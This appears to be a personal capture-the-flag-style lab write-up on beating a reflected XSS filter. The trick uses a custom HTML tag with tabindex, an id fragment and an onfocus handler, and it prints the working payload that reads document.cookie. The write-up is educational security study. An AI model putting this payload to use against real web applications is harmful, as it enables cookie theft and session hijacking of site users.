# Reflected XSS with Custom Tags and `onfocus`

## Goal

Bypass a filter that blocks all standard HTML tags except custom tags and
execute `alert(document.cookie)`.

## What I Learned

The application blocked normal HTML tags but allowed custom HTML elements.

I used a custom tag:

```html
<xss id=x tabindex=1 onfocus=alert(document.cookie)>
````

### `location`

JavaScript's `location` object represents the current page's URL/location.

Assigning a URL to `location` causes the browser to navigate to that URL.

Example:

```js
location = "https://example.com";
```

### `tabindex`

`tabindex` can make an element focusable.

```html
<xss tabindex="1">
```

This allows the element to receive focus.

### `id` and `#`

I gave the custom element an ID:

```html
<xss id="x">
```

The URL fragment:

```text
#x
```

targets the element with `id="x"`.

Because the element was focusable, this allowed the `onfocus` handler to
execute.

## Exploit Flow

```text
Custom tag allowed
       ↓
Add id="x"
       ↓
Add tabindex
       ↓
#x targets the element
       ↓
Element receives focus
       ↓
onfocus executes
       ↓
alert(document.cookie)
```

## Payload

```html
<xss id=x tabindex=1 onfocus=alert(document.cookie)>
```

The payload was delivered through the search parameter and the victim was
redirected to the malicious URL using JavaScript `location`.

## Key Takeaways

* Custom HTML elements can still have HTML attributes and event handlers.
* `tabindex` can make an element focusable.
* `#id` is used to target an element through the URL fragment.
* `onfocus` executes when the element receives focus.
* `location` can be assigned a URL to navigate the browser.
* A tag being custom does not automatically make it safe; its attributes and
  event handlers still matter.

**Lab solved.**

